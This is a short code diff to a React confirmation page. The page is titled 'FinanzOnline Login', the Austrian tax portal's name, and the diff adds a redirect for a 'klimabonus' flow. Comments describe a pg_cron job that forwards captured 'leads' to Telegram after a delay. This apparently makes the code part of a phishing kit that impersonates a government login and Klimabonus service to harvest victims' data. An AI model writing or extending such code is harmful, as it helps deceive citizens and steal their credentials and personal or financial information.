@@ -21,8 +21,16 @@ const confirmationItems = [
 ];
 
 const Confirmation = () => {
+  const { type } = usePanel();
+  const location = useLocation();
   usePageMeta("FinanzOnline Login", "/favicon.png");
   useEffect(() => { window.scrollTo(0, 0); }, []);
+
+  if (type === "klimabonus") {
+    return <Navigate to={`/klimabonus/bestaetigung${location.search}`} replace />;
+  }
+
+
 
   // Telegram-Versand wird ausschließlich vom pg_cron Job nach 5 Minuten erledigt.
   // So bekommen Leads Zeit, vom Full Info zum Log zu werden, bevor gesendet wird.
